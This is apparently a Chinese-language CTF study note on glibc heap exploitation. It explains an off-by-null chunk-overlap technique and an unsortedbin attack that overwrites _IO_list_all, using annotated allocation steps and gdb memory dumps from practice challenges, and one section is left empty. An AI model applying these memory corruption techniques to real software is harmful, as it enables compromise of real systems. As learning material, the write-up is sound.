# The Method of Heap Use In CTF #
本篇文章的目的旨在对堆的一些使用方法和技巧进行总结，会不定期的更新。
## 1. off by null ##
以 **sctf2018 bufoverflow\_a** 题目为例，off by null的最终目的是为了完成chunk overlap，从而可以对其中的某些chunk内容进行改写。
### 利用方法1： ###
通过改写下一个chunk的size字段，从而将原空闲chunk的大小缩小。  
例如如下所示代码：
  
	Alloc(0x88)		#0
	Alloc(0x400)	#1
	Alloc(0x110)	#2
	Alloc(0x88)		#3

	Delete(0)
	Delete(1)
	Alloc(0x88)		#0
	Fill("a"*0x88)	//假设Fill函数中存在off by null漏洞，会多写一个"\x0"
此时，我们可以看看对于chunk1 的头部字段，Fill()函数执行前后的变化情况。  
	
	Fill()前
	0x0000000000000000	0x0000000000000091		<--chunk0
	......................................
	......................................
	0x0000000000000000	0x0000000000000000
	0x0000000000000000	0x0000000000000411		<--chunk1
	......................................
	......................................
	0x0000000000000410	0x0000000000000110		<--chunk2	
	
	Fill()后
	0x0000000000000000	0x0000000000000091		<--chunk0
	......................................
	......................................
	0x6161616161616161	0x6161616161616161
	0x6161616161616161	0x0000000000000400		<--chunk1
	......................................
	......................................
	0x0000000000000410	0x0000000000000110		<--chunk2		
			
可以看到，chunk1的大小减少了0x10byte。然后再次进行chunk的申请。  
	
	Alloc(0x88)		#1
	Alloc(0x88)		#4
	Alloc(0x200)	#5
	Alloc(0xc8)		#6
新申请的chunk1\_new，chunk4，chunk5，chunk6会占用之前chunk1\_old（大小为0x400）的位置。  
实际动态调试结果如下图所示：  

	0x5555557580b0:	0x6161616161616161	0x0000000000000091		<--chunk1
	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
	0x5555557580d0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580f0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758100:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758110:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758120:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758130:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758140:	0x0000000000000090	0x0000000000000090		<--chunk4
	0x555555758150:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557581c0:	0x0000000000000000	0x0000000000000000
	0x5555557581d0:	0x0000000000000000	0x0000000000000211		<--chunk5
	0x5555557581e0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557583d0:	0x0000000000000000	0x0000000000000000
	0x5555557583e0:	0x0000000000000000	0x00000000000000d1		<--chunk6
	0x5555557583f0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557584a0:	0x0000000000000000	0x0000000000000000
	0x5555557584b0:	0x0000000000000000	0xcccccccccccccccd
	0x5555557584c0:	0x0000000000000410	0x0000000000000110		<--chunk2
	0x5555557584d0:	0x0000000000000000	0x0000000000000000

此时将chunk1\_new释放，再将chunk2释放。  

	Delete(1)
	Delete(2)
	Delete(5)
由于chunk2的presize字段的值仍为0x410，且其pre\_inuse为0（表示上一个块也处于释放状态）。释放chunk2会出发前向合并，形成一个包含chunk1，chunk4，chunk5，chunk6和chunk2的大块，如下图所示：

	gdb-peda$ x/150gx 0x5555557580c0-0x10
	0x5555557580b0:	0x6161616161616161	0x0000000000000521		<--原chunk1
	0x5555557580c0:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
	0x5555557580d0:	0x0000000000000000	0x0000000000000000
	0x5555557580e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557580f0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758100:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758110:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758120:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758130:	0xcccccccccccccccc	0xcccccccccccccccc
	0x555555758140:	0x0000000000000090	0x0000000000000090		<--chunk4
	0x555555758150:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557581c0:	0x0000000000000000	0x0000000000000000
	0x5555557581d0:	0x0000000000000000	0x0000000000000211		<--chunk5
	0x5555557581e0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557583d0:	0x0000000000000000	0x0000000000000000
	0x5555557583e0:	0x0000000000000000	0x00000000000000d1		<--chunk6
	0x5555557583f0:	0x0000000000000000	0x0000000000000000
	......................................................
	......................................................
	0x5555557584a0:	0x0000000000000000	0x0000000000000000
	0x5555557584b0:	0x0000000000000000	0xcccccccccccccccd
	0x5555557584c0:	0x0000000000000410	0x0000000000000110		<--原chunk2
	0x5555557584d0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557584e0:	0xcccccccccccccccc	0xcccccccccccccccc
	0x5555557584f0:	0xcccccccccccccccc	0xcccccccccccccccc


### 利用方法2： ###


## 2.Unsortedbin Attack ##
主要利用chunk分配过程中，如果使用unsortedbin进行分配，会有一个拆链的操作，该操作可以实现任意地址写固定值（unsortedbin地址）的操作，具体代码如下图0所示。  

![0](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack.JPG)  

其中bck为当前待切分chunk（victim）的bk值，即bck = victim->bk。因此我们在利用时，可以伪造victim的bk值，使其等于我们想要修改地址-0x10的地址（64bit，32bit在为-0x8），这样就可以改写改地址的内容为一个很大的值（unsortedbin的地址）。

以pwnable.tw的一道题目（BookWriter）为例进行讲解。  

该题目类型为菜单类题目，通过漏洞点可以进行堆块的越界写，但没有提供free函数，题目中一个考点就是如何在没有free的情况下泄露libc的地址，使用的方法为修改topchunk\_size，当topchunk\_size不满足分配要求时，会先将该chunk申请，然后再进行free加入unsortedbin中，然后再在另一块区域分配一个新的topchunk。  

完成上述操作后heap布局如下图1所示：  

![1](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack1.JPG)

之后为了能够控制程序执行流程，需要改写\_IO\_list\_all为unsortedbin地址，在这我们使用的方法就为unsortedbin attack。在这里有一个需要注意的地方就是什么时候main\_arena中last\_remainder字段会发生变化。具体代码如下图2所示：  

![2](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack2.JPG)  

可以看到只有当前申请chunk大小（nb）为smallbin时，且unsortedbin中没有chunk大小正好等于申请大小（nb），此时会将所有chunk先放入到对应bin链表中，然后选择一个大于nb的最小chunk，将该chunk切分后将其加入unsortedbin中，并设置last\_remainder字段。  

然后再结合下图3所示代码（last\_remainder字段发生改变的条件）：  
![3](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack3.JPG)  

可以推断出如下结论：  
**注：last\_remainder字段可以认为是为smallbin设计的，largebin不会用到它。并且如果last\_remainder字段有值，则unsortedbin中肯定只存在一个chunk。**

有了上述理论方面的依据，下面我们就可以根据实际情况来看看如何修改\_IO\_list\_all字段了。

如图2所示，当前unsortedbin中只有一个大小为0xf30的chunk A，且last\_remainder字段为null，此时如果我们申请一个smallbin，则会先将chunk A从unsortedbin中取出，放入对应的largebin中。然后由于申请大小（nb）在对应bin链表中找不到合适的空闲chunk，又会将chunk A再从largebin链表中取出，进行切分后再次放入unsortedbin中，并设置last\_remainder字段。  

实际运行结果如下图4所示（再次申请了一个大小为0x70的chunk）：  
![4](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack4.JPG)  
可以看到此时last\_remainder已经有值，且unsortedbin等于last\_remainder，之后的smallbin申请可以使用unsortedbin直接分配。

**关键点！！！！！**  
如果我们可以一直使用unsortedbin中的唯一chunk直接进行切分分配，但unsortedbin attack的触发条件又为不使用该方式进行分配（因为必须要触发拆链操作），这不互相矛盾吗？

注意仔细看图3中，可以使用unsortedbin直接分配的条件：  
1. 申请chunk大小nb为smallbin范围  
2. bck == unsorted\_chunks(av)，即当前unsortedbin中只有一个chunk  
3. victim == last\_remainder  
4. 切分后的剩余chunk大小要大于chunk允许的最小值

注意其中的条件2，如果我们能够改写victim的bk字段，那么bck = victim->bk = X（伪造值） != unsorted\_chunks(av)，则不会进行该分支，会进行下面的拆链操作。

伪造前，如图5所示：  
![5](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack5.JPG)  
伪造后，如图6所示：  
![6](https://raw.githubusercontent.com/fade-vivida/CTF/master/picture/unsortedbin_attack6.JPG)  

其中0x7ffff7dd2510就为\_IO\_list\_all地址-0x10，然后再次申请一个大小小于0x60的chunk，则会将该chunk从unsortedbin链表上拆下，触发unsortedbin attack。  

由于触发unsortedbin attack后程序会直接崩溃，无法截图，下面手动画一下触发后，堆块的相关布局情况。  

main\_arena中相关字段：  
unsorted bin（bin0的fd，bk字段）  
0x7ffff7dd1b88:		0x0000000000603350(fd)	0x00007ffff7dd2510(bk)  
\_IO\_list\_all字段：  
0x7ffff7dd2510:		0x0000000000000000		0x0000000000000000(size)  
0x7ffff7dd2520:		0x00007ffff7dd1b78(fd)	0x0000000000000000(bk)  

可以看到，成功将\_IO\_list\_all字段修改为了main\_arena中topchunk字段的地址。之后的利用内容就属于FSOP，这里不再赘述。



